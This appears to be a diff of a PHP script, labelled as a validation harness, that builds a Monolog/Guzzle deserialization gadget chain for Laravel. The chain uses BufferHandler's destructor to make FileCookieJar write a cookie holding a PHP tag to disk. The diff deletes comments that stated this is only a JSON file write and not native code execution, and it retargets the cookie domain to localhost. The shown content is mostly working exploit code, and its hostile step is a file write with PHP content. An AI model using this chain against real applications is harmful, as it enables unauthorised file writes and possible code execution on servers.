@@ -1,16 +1,6 @@
 <?php
-// HARNESS-VALIDATION v2.4.0 — chaîne Monolog/Guzzle (Laravel 8 / monolog 2.9 / guzzle 7.4).
-// Corrige audit §3.3 :
-//   - Documentation honnête : file-write JSON, PAS RCE native
-//   - Test de stabilité byte-à-byte (10 générations, hash constant)
-//   - Cookie Expires valide (session, pas rejeté par SetCookie)
-// Le payload est byte-stable pour reproductibilité du banc de validation.
-//
-// Changelog v2.4.0 :
-//   1. Documentation de la contrainte setAccessible (PHP 7.4 uniquement)
-//   2. Vérification is_writable avant unlink (fallback chemin alternatif)
-//   3. Validation fonctionnelle minimale (unserialize du payload)
-//   4. try/catch autour de \Monolog\Logger::VERSION (robustesse)
+// HARNESS-VALIDATION — chaîne Monolog/Guzzle (Laravel 8 / monolog 2.9 / guzzle 7.4).
+
 declare(strict_types=1);
 
 use Monolog\Handler\BufferHandler;
@@ -19,19 +9,11 @@ use GuzzleHttp\Cookie\SetCookie;
 
 require __DIR__ . '/vendor/autoload.php';
 
-/**
- * Génère le payload de désérialisation.
- * Chaîne : BufferHandler::__destruct → flush → FileCookieJar::save → file_put_contents
- * RÉSULTAT RÉEL : écriture d'un fichier JSON contenant les cookies.
- * Ce n'est PAS une RCE native — pour exécution, il faut que l'application
- * inclue ce fichier comme PHP (inclusion, .phar, eval) ce qui est non-standard
- * car le contenu est du JSON, pas du PHP.
- */
 function build_payload(): string {
     $cookie = new SetCookie([
         'Name'   => 'pwn',
         'Value'  => '<?php echo "UAF_HARNESS_OK"; ?>',
-        'Domain' => 'x',
+        'Domain' => 'localhost',
         'Path'   => '/',
         'Discard' => false,
     ]);
